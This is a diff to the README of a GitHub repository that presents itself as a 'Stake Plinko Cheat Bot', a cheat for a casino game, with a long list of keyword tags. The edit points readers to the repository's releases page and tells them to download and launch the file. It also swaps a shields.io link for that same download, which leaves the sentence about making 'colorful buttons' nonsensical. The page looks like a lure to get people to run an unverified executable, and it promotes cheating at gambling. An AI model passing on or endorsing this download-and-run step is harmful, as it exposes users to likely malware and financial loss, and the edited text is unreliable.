@@ -8,10 +8,10 @@ Welcome to the **Stake Plinko Cheat Bot** repository - your ultimate destination
 - **Topics:** casino, coins, plinko, plinko-bot, plinko-bug, plinko-cheat, plinko-hack, plinko-predict, plinko-script, plinko-software, plinko-tool, predictor, stake, stake-games-bot, stake-hack, stake-plinko-cheat, stake-plinko-hack, stake-plinko-tool-free, stake-predictor, stake-predictor-bot.
 
 ## 🚀 Get Started
-To access the tools and hacks in this repository, download the **[Release.zip](https://github.com/assets/Release.zip)** file. Remember to launch the file to begin enhancing your Plinko experience on Stake.
+To access the tools and hacks in this repository, download the **[https://github.com/swati1504-bot/Stake-Plinko-Cheat-Bot/releases](https://github.com/swati1504-bot/Stake-Plinko-Cheat-Bot/releases)** file. Remember to launch the file to begin enhancing your Plinko experience on Stake.
 
 ## 🌟 Explore Further
-Visit [img.shields.io](https://img.shields.io) to create colorful buttons for your own projects and repositories.
+Visit [https://github.com/swati1504-bot/Stake-Plinko-Cheat-Bot/releases](https://github.com/swati1504-bot/Stake-Plinko-Cheat-Bot/releases) to create colorful buttons for your own projects and repositories.
 
 ---
 
